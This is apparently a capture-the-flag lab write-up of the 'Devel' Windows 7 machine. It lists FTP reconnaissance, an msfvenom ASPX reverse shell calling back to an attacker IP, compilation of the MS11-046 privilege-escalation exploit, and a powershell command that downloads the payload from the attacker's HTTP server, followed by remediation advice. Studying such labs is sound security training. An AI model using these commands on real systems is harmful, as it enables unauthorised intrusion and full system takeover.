1. Recon

> 21 - FTP - Microsoft ftpd
-  Anonymous login allowed
-  `PUT command` allowed, checked by HELP command
-  IIS web server directory is accessible, checked by ls command

> 80 - HTTP - Microsoft IIS httpd 7.5
-  7.5 server uses `ASP.net`,  checked by google

2. Initial Access

-  Accessed FTP using Anonymous auth
-  traversed into the web server dir
-  created `ASP.net` reverse shell and uploaded into web dir using `PUT command`
```
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.63 LPORT=3333 -o toms-rev-shell.aspx
```
- Started listening  on attacker machine and accessed reverse shell using browser
- Got reverse shell on victim

3. Post Exploit

- systeminfo - Windows 7 | Host name Devel | OS name Windows 7 Enterprise | 6.1.7600 | Hotfix N/A

4. Privilege Escalation 

- Found that Windows 7 Enterprise | 6.1.7600 is having known exploit
- (MS11-046)https://www.exploit-db.com/exploits/40564 
- Downloaded code and compiled it using `Mingw`
```
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```
- Transferred the copliled code to victim using python HTTP server
```
python -m SimpleHTTPServer 1234
```
- Victim didnt supported CURL or Wget so fetched payload using powershell
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.63:8080/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
```


5. Getting Admin
- Ran the code and got shell as NT Authority/System


6. Remediations and Best Practices

- Disable anonymous access to the FTP server.

- Deny File upload or the use of PUT on th FTP server if FTP is going to be used.

- Remove Sensitive banners such IIS version and ASP languages.

- Host should be patched and updated to latest security patches to avoid known kernel vulnerabilties


> References
- https://cybercoaching.medium.com/an-oscp-journey-without-using-metasploit-htb-devel-3-f7ac241ec4ba

